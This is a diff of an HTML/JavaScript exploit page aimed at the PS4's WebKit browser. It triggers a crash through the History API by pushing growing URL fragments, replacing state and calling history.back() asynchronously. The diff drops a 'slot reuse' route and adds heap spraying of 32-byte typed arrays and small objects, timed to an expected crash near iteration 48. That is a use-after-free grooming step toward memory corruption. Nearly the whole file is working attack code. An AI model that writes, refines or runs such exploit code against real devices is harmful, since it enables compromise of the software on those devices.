@@ -2,25 +2,46 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – Dual Exploitation Routes</title>
-
+<title>PS4 WebKit – Route 2 Heap Substitution Probe</title>
+<style>
+body {
+    font-family: monospace;
+    background: #000;
+    color: #0f0;
+    padding: 20px;
+}
+button {
+    font-size: 16px;
+    padding: 12px;
+    margin: 10px 0;
+}
+#log {
+    white-space: pre-wrap;
+    border: 1px solid #0f0;
+    padding: 10px;
+    max-height: 520px;
+    overflow-y: auto;
+}
+.warn { color: #ff0; }
+.crit { color: #f00; }
+</style>
 </head>
 
 <body>
-<h2>PS4 WebKit – History Exploitation Routes</h2>
+<h2>PS4 WebKit – Route 2 Heap Substitution Probe</h2>
 
-<button onclick="runRoute1()">ROUTE 1 — SLOT REUSE (HistoryItem Collision)</button>
-<button onclick="runRoute2()">ROUTE 2 — FRAGMENT BUFFER REPLACEMENT</button>
+<button onclick="runRoute2()">RUN ROUTE 2 + HEAP SUBSTITUTION</button>
 
 <div id="log"></div>
 
 <script>
 const logEl = document.getElementById("log");
-function log(m,c=""){ 
-  const s=document.createElement("span");
-  if(c) s.className=c;
-  s.textContent=m+"\n";
-  logEl.appendChild(s);
+function log(m, cls=""){
+    const s = document.createElement("span");
+    if(cls) s.className = cls;
+    s.textContent = m + "\n";
+    logEl.appendChild(s);
+    logEl.scrollTop = logEl.scrollHeight;
 }
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
@@ -28,94 +49,72 @@ const BASE = 977;
 const STEP = 14461;
 const ITERS = 50;
 
-// =====================================================
-// ROUTE 1 — SLOT REUSE / COLLISION
-// =====================================================
-async function runRoute1(){
-  logEl.textContent="";
-  log("=== ROUTE 1: SLOT REUSE ===","crit");
+let heapSpray = [];
+let buffers = [];
 
-  let size = BASE;
-  let states = [];
+async function heapSubstitute(tag){
+    log(`[HS] Heap substitution phase (${tag})`, "warn");
 
-  for(let i=0;i<ITERS;i++){
-    const payload = "A".repeat(size);
-    const state = { idx:i, data:payload };
-
-    log(`[ITER ${i}] size=${size}`);
-    history.pushState(state,"","#"+payload);
-    history.replaceState(state,"","#"+payload);
-
-    // force circular reuse
-    if(i >= 32){
-      log("  [reuse] overwriting circular slot","warn");
-      history.pushState(
-        { idx:i, reuse:true },
-        "",
-        "#R"+i+"_"+"B".repeat(1024)
-      );
+    // 32-byte class (target size)
+    for(let i=0;i<2000;i++){
+        buffers.push(new Uint8Array(32));
     }
 
-    if(i % 6 === 0){
-      setTimeout(()=>history.back(),0);
-      log("  async back()","warn");
+    // Small JSObjects
+    for(let i=0;i<1000;i++){
+        heapSpray.push({ a:i, b:i+1, c:i+2 });
     }
 
-    size += STEP;
-    await sleep(3);
-  }
-
-  log(">>> END ROUTE 1 (should crash)","crit");
+    log(`[HS] Allocated Uint8Array(32) x ${buffers.length}`);
+    log(`[HS] Allocated JSObjects x ${heapSpray.length}`);
 }
 
-// =====================================================
-// ROUTE 2 — FRAGMENT BUFFER REPLACEMENT
-// =====================================================
 async function runRoute2(){
-  logEl.textContent="";
-  log("=== ROUTE 2: FRAGMENT BUFFER REPLACEMENT ===","crit");
+    logEl.textContent = "";
+    heapSpray = [];
+    buffers = [];
 
-  let size = BASE;
+    log("=== ROUTE 2 – FRAGMENT BUFFER REPLACEMENT ===", "crit");
+    log("Expected crash ~ ITER 48 (history.back async)\n");
 
-  for(let i=0;i<ITERS;i++){
-    let payload;
+    let size = BASE;
 
-    // alternate large / small to recycle StringImpl
-    if(i >= 46){
-      payload = (i % 2 === 0)
-        ? "X".repeat(32)
-        : "Y".repeat(size);
-      log(`[ITER ${i}] alternating fragment size=${payload.length}`,"warn");
-    } else {
-      payload = "A".repeat(size);
-      log(`[ITER ${i}] size=${size}`);
+    for(let i=0;i<ITERS;i++){
+        let payload;
+
+        // Alternating fragment pattern
+        if(i >= 46){
+            payload = (i % 2 === 0) ? "A".repeat(32) : "B".repeat(size);
+            log(`[ITER ${i}] alternating fragment size=${payload.length}`, "warn");
+        } else {
+            payload = "A".repeat(size);
+            log(`[ITER ${i}] size=${size}`);
+        }
+
+        history.pushState({}, "", "#"+payload);
+        history.replaceState({}, "", "#"+payload);
+
+        // Critical window
+        if(i === 47){
+            log("\n>>> ENTERING CRITICAL WINDOW <<<", "crit");
+            await heapSubstitute("pre-back");
+        }
+
+        if(i % 6 === 0){
+            setTimeout(()=>history.back(), 0);
+            log("  history.back() ASYNC scheduled", "warn");
+        }
+
+        size += STEP;
+        await sleep(3);
     }
 
-    history.pushState({i},"","#"+payload);
-    history.replaceState({i},"","#"+payload);
-
-    if(i === 47){
-      log(">>> PRE-BACK BUFFER PRESSURE <<<","warn");
-      for(let j=0;j<200;j++){
-        location.hash = "#P"+j+"_"+"Z".repeat(64);
-      }
-    }
-
-    if(i % 6 === 0){
-      setTimeout(()=>history.back(),0);
-      log("  async back()","warn");
-    }
-
-    size += STEP;
-    await sleep(3);
-  }
-
-  log(">>> END ROUTE 2 (should crash)","crit");
+    log("\n=== END (should not reach if crash occurs) ===");
 }
 
 log("Ready.");
-log("Both routes preserve original crash conditions.");
-log("Expected crash near ITER 48.");
+log("This test preserves EXACT crash mechanics.");
+log("Only addition: heap substitution before ITER 48.");
 </script>
 </body>
 </html>
